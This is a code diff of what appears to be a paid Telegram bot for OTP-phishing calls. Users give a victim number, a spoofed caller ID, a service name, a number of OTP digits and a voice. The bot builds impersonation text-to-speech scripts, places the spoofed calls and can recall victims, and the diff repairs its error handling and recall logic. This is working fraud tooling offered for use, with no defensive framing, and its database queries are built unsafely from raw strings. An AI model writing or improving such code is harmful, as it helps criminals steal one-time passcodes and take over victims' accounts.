@@ -919,7 +919,7 @@ def recall_now(message):
                             c.execute(f"select * from call_data where chat_id={id} limit 1")
                             last_script = c.fetchone()
                             if last_script[2]=='call':
-                                 make_call(vict,caller,id,f'{last_script[2]}')
+                                 pass
                             elif last_script[2]=='custom':
                                  c.execute(f"select * from users where user_id={id} limit 1")
                                  clast_script = c.fetchone()
@@ -928,6 +928,8 @@ def recall_now(message):
                                  c.execute(f"select * from users where user_id={id} limit 1")
                                  clast_script = c.fetchone()
                                  alpha_make_call(vict,caller,id,clast_script[6])
+                            else:
+                                 make_call(vict,caller,id,f'{last_script[2]}')
                         except:
                             print("Unknown Error Recalling")
                 elif days==0:    
@@ -1632,14 +1634,14 @@ def make_call_custon(message):
     if row!=None :
         if row[3]!='ban':
             if user_day_check(id)>0:
-                        mes =(message.text).split()
-                        try:
-                            number = mes[1]
-                            spoof = mes[2]
-                            service = mes[3]
-                            otp_digit = mes[4]
-                            voice = mes[5]
-                            bot.send_message(message.from_user.id,f"""
+                    mes =(message.text).split()
+                    try:
+                        number = mes[1]
+                        spoof = mes[2]
+                        service = mes[3]
+                        otp_digit = mes[4]
+                        voice = mes[5]
+                        bot.send_message(message.from_user.id,f"""
 ┏━━⚇
 ┃<b>Call Details</b> 🤳 
 ┗━━━━━━━━✺
@@ -1648,8 +1650,6 @@ def make_call_custon(message):
 <b>[📝] Script ID »»</b> <code>{service}</code>
 <b>[🧏]Voice »»</b><code>{voice}</code>
 """,parse_mode='HTML')
-                        except:
-                            bot.send_message(message.from_user.id, f"*Somthing went wrong.\n/call <Victim Number> <Spoof Number> <Service> <otp digits> <voice>*",parse_mode='markdown')
                         
                         script_name = service+voice+otp_digit
                         check_path = f"../../var/www/sourceotp.online/scripts/{script_name}"
@@ -1671,12 +1671,15 @@ def make_call_custon(message):
                             c.execute(f"update users set v_no={number},spoof_no={spoof},sc_id={script_id},inp_sc='{voice}',del_col=0,username='{username}' where user_id={id} ")
                             db.commit()
                             
+
+                        
                         Convert_TTS(SC1.format(service_name=service),SC2.format(digits=otp_digit),SC5,SC3,SC4,script_name,voice)
                         c.execute(f"update call_data set last_service='{script_name}' where chat_id={id} ")
                         db.commit()
                         call_update(id)
                         b=make_call(f= f"{spoof}",t=f"{number}",user_id=id,service=script_name)
-                    
+                    except:
+                        bot.send_message(message.from_user.id, f"*Somthing went wrong.\n/call <Victim Number> <Spoof Number> <Service> <otp digits> <voice>*",parse_mode='markdown')
             else:
                    bot.send_message(message.from_user.id, "*🚫Buy Subscription.🚫*",parse_mode='markdown')  
                    delete_data(id) 
